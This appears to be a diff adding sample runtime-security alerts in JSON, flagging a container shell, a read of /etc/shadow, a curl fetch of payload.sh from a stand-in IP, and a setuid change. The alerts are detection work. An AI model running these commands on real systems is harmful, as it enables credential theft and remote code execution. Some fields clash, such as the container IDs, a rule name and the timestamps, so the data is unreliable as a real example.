@@ -1,0 +1,79 @@
+[
+  {
+    "output": "22:14:03.881442312: Critical Shell spawned in a container with an attached terminal (user=root user_loginuid=-1 container_id=4f8a2b1c9d3e image=registry.example.com/secuq-demo/api-service shell=bash parent=runc cmdline=bash -i pod=api-service-7c9f8d6b5-xk2p9 namespace=production)",
+    "priority": "Critical",
+    "rule": "Terminal shell in container",
+    "time": "2026-08-30T22:14:03.881442312Z",
+    "output_fields": {
+      "container.id": "4f8a2b1c9d3e",
+      "container.image.repository": "registry.example.com/secuq-demo/api-service",
+      "container.name": "api-service",
+      "evt.time": 1756591643881442312,
+      "k8s.ns.name": "production",
+      "k8s.pod.name": "api-service-7c9f8d6b5-xk2p9",
+      "proc.cmdline": "bash -i",
+      "proc.name": "bash",
+      "proc.pname": "runc",
+      "user.loginuid": -1,
+      "user.name": "root"
+    },
+    "hostname": "gke-secuq-prod-node-3",
+    "source": "syscall",
+    "tags": ["container", "shell", "mitre_execution", "T1059"]
+  },
+  {
+    "output": "22:16:47.220981004: Warning Sensitive file opened for reading by non-trusted program (file=/etc/shadow gparent=containerd-shim ggparent=<NA> gggparent=<NA> proc=cat pid=48213 pcmdline=cat /etc/shadow user=www-data user_loginuid=-1 container_id=7b2c3d4e5f6a image=registry.example.com/secuq-demo/api-service pod=api-service-7c9f8d6b5-xk2p9 namespace=production)",
+    "priority": "Warning",
+    "rule": "Read sensitive file untrusted",
+    "time": "2026-08-30T22:16:47.220981004Z",
+    "output_fields": {
+      "container.id": "7b2c3d4e5f6a",
+      "container.image.repository": "registry.example.com/secuq-demo/api-service",
+      "fd.name": "/etc/shadow",
+      "k8s.ns.name": "production",
+      "k8s.pod.name": "api-service-7c9f8d6b5-xk2p9",
+      "proc.cmdline": "cat /etc/shadow",
+      "proc.name": "cat",
+      "proc.pid": 48213,
+      "user.name": "www-data"
+    },
+    "hostname": "gke-secuq-prod-node-3",
+    "source": "syscall",
+    "tags": ["filesystem", "mitre_credential_access", "T1552.001"]
+  },
+  {
+    "output": "22:19:12.004411873: Notice Outbound connection to unexpected destination (command=curl -s http://198.51.100.23/payload.sh connection=10.4.2.11:52344->198.51.100.23:80 container_id=9c8d7e6f5a4b image=registry.example.com/secuq-demo/worker-service pod=worker-service-5d9c7b8f4-mm2q1 namespace=production)",
+    "priority": "Notice",
+    "rule": "Unexpected outbound connection destination",
+    "time": "2026-08-30T22:19:12.004411873Z",
+    "output_fields": {
+      "container.id": "9c8d7e6f5a4b",
+      "container.image.repository": "registry.example.com/secuq-demo/worker-service",
+      "fd.rip": "198.51.100.23",
+      "fd.rport": 80,
+      "k8s.ns.name": "production",
+      "k8s.pod.name": "worker-service-5d9c7b8f4-mm2q1",
+      "proc.cmdline": "curl -s http://198.51.100.23/payload.sh"
+    },
+    "hostname": "gke-secuq-prod-node-1",
+    "source": "syscall",
+    "tags": ["network", "mitre_command_and_control", "T1071"]
+  },
+  {
+    "output": "22:20:55.667123098: Informational Container privileges changed via setuid (proc=entrypoint.sh newuid=0 olduid=1000 container_id=1a2b3c4d5e6f image=registry.example.com/secuq-demo/api-service pod=api-service-7c9f8d6b5-xk2p9 namespace=production)",
+    "priority": "Informational",
+    "rule": "Change thread namespace",
+    "time": "2026-08-30T22:20:55.667123098Z",
+    "output_fields": {
+      "container.id": "1a2b3c4d5e6f",
+      "container.image.repository": "registry.example.com/secuq-demo/api-service",
+      "k8s.ns.name": "production",
+      "k8s.pod.name": "api-service-7c9f8d6b5-xk2p9",
+      "proc.name": "entrypoint.sh",
+      "user.uid": 0
+    },
+    "hostname": "gke-secuq-prod-node-3",
+    "source": "syscall",
+    "tags": ["process"]
+  }
+]
